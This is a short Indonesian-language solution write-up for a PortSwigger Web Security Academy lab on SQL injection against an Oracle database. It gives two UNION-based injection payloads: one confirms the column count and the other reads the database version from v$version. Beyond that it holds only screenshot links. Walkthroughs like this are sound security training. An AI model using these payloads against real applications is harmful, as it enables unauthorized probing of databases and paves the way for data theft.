# 1. SQL injection attack, querying the database type and version on Oracle

# 2. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

# 3. Penyelesaian

a. Verifikasi bahwa query mengembalikan dua kolom, keduanya berisi teks, menggunakan payload ```'+UNION+SELECT+'abc','def'+FROM+dual--``` pada parameter kategori (bebas):

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4e2b3c8d-8628-40ac-ad83-0891ef563d64" />

b. Kemudian gunakan payload ini untuk mengakses database ```'+UNION+SELECT+BANNER,+NULL+FROM+v$version--```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/5932b228-f4a2-4e47-82ee-1f88202a1423" />
